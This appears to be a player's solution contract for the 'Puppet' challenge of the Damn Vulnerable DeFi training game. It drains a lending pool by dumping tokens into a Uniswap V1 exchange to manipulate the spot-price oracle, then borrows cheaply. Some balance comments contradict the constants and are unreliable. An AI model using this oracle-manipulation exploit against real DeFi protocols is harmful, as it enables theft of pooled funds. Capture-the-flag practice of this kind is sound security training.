// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";

contract PuppetExploiter {
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    IUniswapV1Exchange public uniswapV1Exchange;
    DamnValuableToken public token;
    PuppetPool public lendingPool;
    address public recovery;

    constructor(
        IUniswapV1Exchange _uniswapV1Exchange,
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        address _recovery
    ) payable {
        uniswapV1Exchange = _uniswapV1Exchange;
        token = _token;
        lendingPool = _lendingPool;
        recovery = _recovery;
    }

    function attack(uint256 borrowAmount) public payable {
        console.log("Exchange Balance:", address(uniswapV1Exchange).balance);
        console.log("Exchange Token Balance:", token.balanceOf(address(uniswapV1Exchange)));
        console.log("Price: ", lendingPool.calculateDepositRequired(borrowAmount));

        // 4. Approve the exchange to transfer 1000 DVT
        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        // Player - 1000 DVT
        // Player - 25 ETH

        // Pool - 10k DVTs
        // Pool - 10k ETHs
        // 5. Swap 1000 DVT for 1 ETH
        // Pool - 1010 DVT
        // Pool - 0.099 ETH
        uniswapV1Exchange.tokenToEthSwapInput(1000 ether, 1, block.timestamp * 2);

        console.log("Exchange Balance:", address(uniswapV1Exchange).balance);
        console.log("Exchange Token Balance:", token.balanceOf(address(uniswapV1Exchange)));
        console.log("Price: ", lendingPool.calculateDepositRequired(borrowAmount));
        // Price - 19.6643298887982

        // Deposit - 20 ETH (required: 19.66 ETH)
        lendingPool.borrow{value: 20 ether}(borrowAmount, recovery);
    }

    receive() external payable {}
}
